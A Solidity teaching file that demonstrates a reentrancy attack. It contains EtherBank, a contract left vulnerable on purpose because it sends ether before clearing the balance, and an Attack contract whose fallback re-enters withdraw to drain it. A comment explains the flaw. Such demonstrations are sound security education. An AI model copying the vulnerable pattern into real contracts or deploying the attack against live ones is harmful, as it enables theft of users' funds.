// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
EtherBank is a contract where you can deposit and withdraw ETH as you would from a bank account.
This contract is vulnerable to re-entrancy attack.

The balances of the user are not updated before the ether is sent to the user in the withdraw function.
Meaning that if another smart contract called this function and didn't have a smart function it would call the fallback function.
This fallback function can be used to call the withdraw function within EtherBank again, effectively withdrawing more funds than
the user is entitled to.
*/

contract EtherBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherBank public etherBank;

    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherBank).balance >= 1 ether) {
            etherBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherBank.deposit{value: 1 ether}();
        etherBank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}